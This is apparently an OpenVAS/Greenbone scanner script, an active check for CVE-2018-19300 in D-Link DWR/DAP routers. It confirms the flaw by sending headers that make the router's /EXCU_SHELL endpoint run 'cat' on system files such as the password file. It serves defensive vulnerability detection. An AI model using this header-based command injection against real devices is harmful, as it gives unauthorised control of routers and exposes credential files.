# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113294");
  script_version("2025-04-22T10:32:18+0000");
  script_tag(name:"last_modification", value:"2025-04-22 10:32:18 +0000 (Tue, 22 Apr 2025)");
  script_tag(name:"creation_date", value:"2018-11-08 17:13:37 +0100 (Thu, 08 Nov 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-04-12 18:23:00 +0000 (Fri, 12 Apr 2019)");

  script_cve_id("CVE-2018-19300");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DWR/DAP 'EXCU_SHELL' RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl", "os_detection.nasl");
  # nb: No "more" specific mandatory keys because there might be different (branded) devices/vendors
  # affected as well...
  script_mandatory_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://forum.greenbone.net/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210324172330/https://www.greenbone.net/en/serious-vulnerability-discovered-in-d-link-routers/");
  script_xref(name:"URL", value:"https://www.dlink.com/en/support/support-news/2019/march/19/remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers");

  script_tag(name:"summary", value:"D-Link DWR and DAP Routers are prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability exists within /EXCU_SHELL, which processes
  HTTP requests and performs any commands given to it on the target system with admin privileges.");

  script_tag(name:"impact", value:"Successful exploitation would give an attacker complete control
  over the target system.");

  script_tag(name:"affected", value:"D-Link DWR and DAP Routers. Other devices and vendors might be
  affected as well. Please see the referenced vendor advisory for a complete list of affected
  devices.");

  script_tag(name:"solution", value:"The vendor has started to release firmware updates to address
  this issue. Please see the references for more information.");

  exit(0);
}

# nb: This flaw is quite similar to:
# - 2023/dlink/gb_dlink_dir_rce_vuln_jun23_active.nasl
# - gsf/2023/edgecore/gb_edgecore_CVE-2019-6288_active.nasl
# and just has different commands in the passed headers.

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default: 80 );

url = "/EXCU_SHELL";

res = http_get_cache( port: port, item: url );
# nb:
# - Just a basic check as we have three active-VTs accessing the same endpoint
# - Only checking for 404 on purpose as we don't know if every affected target is e.g. responding
#   with a 200 status code
if( ! res || res =~ "^HTTP/1\.[01] 404" )
  exit( 0 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  cmd = "cat /" + file;
  add_headers = make_array( "cmdnum", "1", "command1", cmd, "confirm1", "n" );

  req = http_get_req( port: port, url: url, add_headers: add_headers, accept_header: "*/*", host_header_use_ip: TRUE );
  res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );

  # nb: Only the following without any other users:
  # admin:<redacted>:0:0:Adminstrator:/:/bin/sh
  if( egrep( pattern: pattern, string: res, icase: FALSE ) ) {

    info["HTTP Method"] = "GET";
    info["Affected URL"] = http_report_vuln_url( port: port, url: url, url_only: TRUE );
    foreach header( keys( add_headers ) )
      info['HTTP "' + header + '" Header'] = add_headers[header];

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table( array: info ) + '\n\n';
    report += "it was possible to execute the command '" + cmd + "' on the target.";
    report += '\n\nResult (truncated):\n\n' + substr( res, 0, 1500 );
    expert_info  = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res + '\n\n';
    security_message( port: port, data: chomp( report ), expert_info: expert_info );

    exit( 0 );
  }
}

exit( 99 );
